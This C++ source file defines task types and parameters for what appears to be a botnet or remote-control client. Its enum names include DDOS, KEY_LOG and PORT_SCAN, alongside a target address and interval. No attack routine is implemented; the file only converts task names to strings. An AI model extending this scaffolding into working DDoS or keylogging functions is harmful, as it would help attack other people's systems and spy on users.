#include "task.h"
#include <vector>

Task::Task() {
    id = 0;
    task = taskOptionsToString(TaskOptions::UNKNOWN);
    taskParams = TaskParameters();
}


TaskParameters::TaskParameters() {
    interval = 10;
    address = "0.0.0.0";
    log = false;
}

std::string progressToString(Progress progress) {
    switch (progress) {
        case Progress::SUCCESS:
            return "SUCCESS";
        case Progress::WORKING:
            return "IN_PROGRESS";
        case Progress::FAILURE:
            return "FAILURE";
        default:
            return "UNKNOWN";
    }
}

std::string taskOptionsToString(TaskOptions taskOptions) {
    switch (taskOptions) {
        case TaskOptions::DDOS:
            return "DDOS";
        case TaskOptions::KEY_LOG:
            return "KEY_LOG";
        case TaskOptions::PORT_SCAN:
            return "PORT_SCAN";
        case TaskOptions::QUACK:
            return "QUACK";
        case TaskOptions::STORAGE:
            return "STORAGE";
        default:
            return "UNKNOWN";
    }
}

TaskOptions getTaskOption(const std::string& task) {
    if (task == "DDOS") {
        return TaskOptions::DDOS;
    }
    else if (task == "KEY_LOG") {
        return TaskOptions::KEY_LOG;
    }
    else if (task == "PORT_SCAN") {
        return TaskOptions::PORT_SCAN;
    }
    else if (task == "QUACK") {
        return TaskOptions::QUACK;
    }
    else if (task == "STORAGE") {
        return TaskOptions::STORAGE;
    }
    else {
        return TaskOptions::STORAGE; // Default option if none of the above match
    }
}

void processLog(const std::string& log, std::vector<std::string>* logs) {
    std::cout << log << std::endl;
    logs->push_back(log);
}